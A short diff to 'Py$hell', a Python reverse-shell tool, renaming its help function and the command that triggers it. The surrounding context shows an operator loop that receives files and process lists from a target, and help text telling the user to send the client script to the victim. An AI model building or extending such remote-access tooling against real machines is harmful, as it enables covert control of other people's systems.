@@ -96,8 +96,8 @@ def reverse_shell(conn):
                             break
                         file_to_write.write(bytes(data))
                     file_to_write.close()
-            elif "help" in command.lower():
-                help()
+            elif "help5" in command.lower():
+                help5()
                 continue
             elif "ps" in command.lower():
                 stdout = conn.recv(BUF_SIZE).decode(FORMAT)
@@ -122,7 +122,7 @@ def reverse_shell(conn):
         s.close()
 
 
-def help1():
+def help5():
     print("""HELP ME PLEASE:
 \tThis is Py$hell, a python based reverse shell.
 \tYou need to send to the target the client side of the script.
